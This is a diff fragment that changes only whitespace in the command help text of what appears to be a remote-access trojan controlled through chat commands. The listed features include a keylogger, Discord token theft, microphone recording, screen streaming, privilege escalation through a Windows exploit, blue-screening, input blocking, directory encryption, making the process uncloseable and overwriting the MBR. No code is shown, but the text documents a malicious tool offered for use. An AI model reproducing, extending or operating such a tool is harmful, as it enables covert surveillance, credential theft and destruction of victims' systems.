@@ -28,7 +28,7 @@ COMMANDS:
 .volume {volume}:                        sets audio volume 
 .screencount:                            counts monitors 
 .download {link} {path}:                 download file 
-.execute {path}:               		       executes program 
+.execute {path}:               		 executes program 
 .hidefile {path}:                        hides file 
 .showfile {path}:                        shows file 
 .smallupload {path}:                     only usefull for sth like a txt file (8mb) 
@@ -44,24 +44,24 @@ COMMANDS:
 .recordmic {milliseconds}                records microphone 
 .gettoken                                grabs discord token 
 .playaudio {link} {type}                 plays audio file 
-.amiadmin				                         show if you have admin privileges
-.tryescalate				                     uses a windows exploit to gain admin privileges
-.message {text}				                   shows a messagebox
-.startstream				                     sends screenshot every second
-.stopstream				                       stops streaming
-.startkeylogger				                   starts keylogger
-.stopkeylogger				                   stops keylogger
-.bsod					                           bluescreens pc (requires admin priveleges)
-.blockinput				                       blocks m&k input (requires admin priveleges)
-.unblockinput				                     unblocks m&k input (requires admin priveleges)
-.crit					                           user can't terminate the process without crshing the pc (requires admin priveleges)
-.uncrit					                         uncrits process (requires admin priveleges)
-.troll					                         troll + bsod (requires admin priveleges)
+.amiadmin				 show if you have admin privileges
+.tryescalate				 uses a windows exploit to gain admin privileges
+.message {text}				 shows a messagebox
+.startstream				 sends screenshot every second
+.stopstream				 stops streaming
+.startkeylogger				 starts keylogger
+.stopkeylogger				 stops keylogger
+.bsod					 bluescreens pc (requires admin priveleges)
+.blockinput				 blocks m&k input (requires admin priveleges)
+.unblockinput				 unblocks m&k input (requires admin priveleges)
+.crit					 user can't terminate the process without crshing the pc (requires admin priveleges)
+.uncrit					 uncrits process (requires admin priveleges)
+.troll					 troll + bsod (requires admin priveleges)
 .encrdir {path} {typeFilter}             encrypts directory (requires admin priveleges)
-.decrdir {path} 	                       decrypts directory (requires admin priveleges)
-.mbrkiller				                       overwrites mbr (completely destroys windows) (requires admin priveleges)
-.disabletaskmgr				                   disables task manager
-.enabletaskmgr				                   enables task manager
+.decrdir {path} 	                 decrypts directory (requires admin priveleges)
+.mbrkiller			         overwrites mbr (completely destroys windows) (requires admin priveleges)
+.disabletaskmgr				 disables task manager
+.enabletaskmgr				 enables task manager
 				
 [SYNTAX] 
 Text:                                    '_' -> ' ' 
